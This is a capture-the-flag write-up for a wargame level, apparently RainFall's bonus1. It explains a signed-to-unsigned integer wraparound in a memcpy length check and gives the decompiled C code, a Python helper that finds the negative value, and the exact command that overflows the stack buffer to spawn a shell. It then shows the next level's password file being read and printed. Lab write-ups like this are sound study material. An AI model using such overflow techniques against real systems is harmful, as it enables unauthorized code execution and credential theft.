
```
   int main(int argc, char** argv, char** envp) 
    {
        char buffer[40];
        int input_length = atoi(argv[1]);

        if (input_length > 9)
        {
            return 1;
        }

        memcpy(buffer, argv[2], input_length * 4);

        if (input_length == 0x574F4C46)
        {
            execl("/bin/sh", "sh", NULL);
        }

        return 0;
    }

```
- The atoi(argv[1]) converts a string to an int.

- The input_length should be <= 9, or it exits.

- If input_length is negative, input_length * 4 results in a large unsigned value.

- This causes memcpy() to copy much more than 40 bytes, leading to a buffer overflow.

- The buffer[40] is a stack variable, so overflowing it can overwrite input_length and we can put FLOW in input_length and spawn a shell.


In C, atoi() returns a signed int. Signed integers go from:

INT_MIN = -2147483648 to INT_MAX = 2147483647

But memory works in unsigned 32-bit, which goes from 0 to 4294967295 (0xFFFFFFFF).

If we input a negative number, its bit representation will still be interpreted as a large unsigned number during operations like input_length * 4.

So we need a number that if we do input_length * 4 it will give us 44 and at the same time int input_length = atoi(argv[1]); <= 9

- calculate the number:

```
    for x in range(-2**30, 10):
    result = (x * 4) & 0xFFFFFFFF  # simulate unsigned 32-bit
    if result == 44:
        print(f"Found: {x}, x * 4 (unsigned) = {result}")
        break
```
```
    bonus1 git:(bbrahim) ✗ python3 calcul.py
    Found: -1073741813, x * 4 (unsigned) = 44
```

- the number is -1073741813

- and we have 40 A : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA for the buff and FLOW for input_length

```
    bonus1@RainFall:~$ ./bonus1 -1073741813 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
    $ cat /home/user/bonus2/.pass
    579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```